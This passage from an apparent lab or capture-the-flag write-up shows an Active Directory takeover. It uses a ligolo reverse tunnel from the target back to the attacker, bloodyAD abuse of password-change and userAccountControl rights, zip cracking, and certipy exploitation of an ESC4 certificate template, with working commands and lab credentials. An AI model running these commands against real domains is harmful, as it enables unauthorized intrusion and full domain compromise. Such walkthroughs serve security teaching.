These are `.eml` mail files. Starting an SMB server on the attacker machine to transfer them across quickly:

```python
impacket-smbserver share . -smb2support -username 0xd1s -password 0xd1s
```

{% image23 %}

Inspecting the EML files reveals a cleartext password inside:

{% image24 %}

Validating the password with a quick SMB share enumeration:

{% image25 %}

Back in the BloodHound data, this user holds `ForceChangePassword` over the `WEBADMIN` user:

{% image26 %}

Abusing it the same way as before with `bloodyAD`:

{% image27 %}

The path forward is unclear at this point. Fuzzing the web application surfaces nothing, and enumerating with the new credentials leads nowhere either.

Connecting over WinRM as the `daniel.hoffmann` user and reviewing the active network connections:

{% image28 %}

A non-standard port (5000) is listening locally on the host. Reaching it requires a tunnel, set up with ligolo: `./proxy -selfcert -laddr 0.0.0.0:11601`.

A few steps prepare the tunnel before it can carry traffic:

→ Create the network interface: `ifcreate --name webserver`

→ Add the custom internal route cidr: `route_add --name webserver --route 240.0.0.1/32`

On the target, connect the agent back to the proxy: `.\agent.exe -connect 10.200.34.161:11601 -ignore-cert`

Then start the tunnel: `tunnel_start --tun webserver`

{% image29 %}

Accessing the internal webserver through the tunnel returns an authorization bearer prompt:

{% image30 %}

Supplying the `webadmin` credentials grants access to the application:

{% image31 %}

### Internal Admin Interface - Privilege Escalation

Downloading the file and attempting to unzip the archive shows it is password protected:

{% image32 %}

Extracting the archive hash with `zip2john` to crack it and recover the password:

{% image33 %}

The hash does not crack against the standard wordlist. Building a custom wordlist from the site's own content with `cewl` provides better candidates: `cewl --depth 10 --with-numbers --write cewl.txt http://404finance.local/history.html`

This wordlist cracks the password:

{% image34 %}

The archive contains a file named `config.dat` with the following:

```python
# Configuration Backup - Do not delete!
[ServiceUser]
username = svc.services
password = S3rv1cePower2024!
host = WIN-SRV01
autostart = true
```

Authenticating as this user returns a `STATUS_ACCOUNT_DISABLED` error:

{% image35 %}

The BloodHound data shows nothing obvious for bypassing the disabled state.

Checking with `bloodyAD` for any WRITE permissions over this account: `bloodyAD -d 404finance.local -u 'ROBERT.GRAEF' -p 'Password123!' -i 10.1.92.153 get writable`

The output confirms WRITE permissions over the Service Account user:

{% image36 %}

The DN `CN=Service Account,CN=Users,DC=404finance,DC=local` is worth inspecting to see which account it maps to, using [powerview.py](http://powerview.py):

```python
python3 /opt/powerview.py/powerview.py 404finance.local/ROBERT.GRAEF:'Password123!'@10.1.92.153
```

The query used is: `Get-ObjectOwner -Identity "CN=Service Account,CN=Users,DC=404finance,DC=local"`

{% image37 %}

The owner is [`svc.services`](http://svc.services), the account of interest. Running `bloodyAD` with `--detail` shows write access to the UAC (userAccountControl) attribute:

{% image38 %}

The userAccountControl value carries the `ACCOUNTDISABLE` flag, which is what keeps the account disabled. Clearing that flag re-enables it:

```python
bloodyAD -d 404finance.local -u 'ROBERT.GRAEF' -p 'Password123!' -i 10.1.92.153 remove uac svc.services -f ACCOUNTDISABLE
```

{% image39 %}

### ESC4 Vulnerability - Domain Pwnage

The BloodHound data now shows an abusable certificate template named VULN-ESC4:

{% image40 %}

This can also be confirmed with `certipy-ad`: `certipy-ad find -u svc.services@404finance.local -p 'S3rv1cePower2024!' -dc-ip 10.1.92.153 -vulnerable -stdout`

The output confirms the template is vulnerable to ESC4, where weak access control on the template lets an attacker rewrite its own configuration into an exploitable one:

{% image41 %}

Overwriting the template with a default, exploitable configuration:

```python
➜  404bank certipy-ad template \
    -u 'svc.services@404finance.local' -p 'S3rv1cePower2024!' \
    -dc-ip '10.1.92.153' -template 'Vuln-ESC4' \
    -write-default-configuration
```

{% image42 %}

Requesting a certificate through the modified template while impersonating the Administrator:

```python
➜  404bank certipy-ad req \
    -u 'svc.services@404finance.local' -p 'S3rv1cePower2024!' \
    -dc-ip '10.1.92.153' -target 'DC-404.404finance.local' \
    -ca '404finance-DC-404-CA' -template 'Vuln-ESC4' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-2956725473-317782918-2795636496-500'
```

Authenticating with the issued certificate to recover the Administrator's NT hash:

```python
certipy-ad auth -pfx administrator.pfx -dc-ip 10.1.92.153
```

{% image43 %}

Connecting with `evil-winrm` using the recovered hash to collect the final flags:

{% image44 %}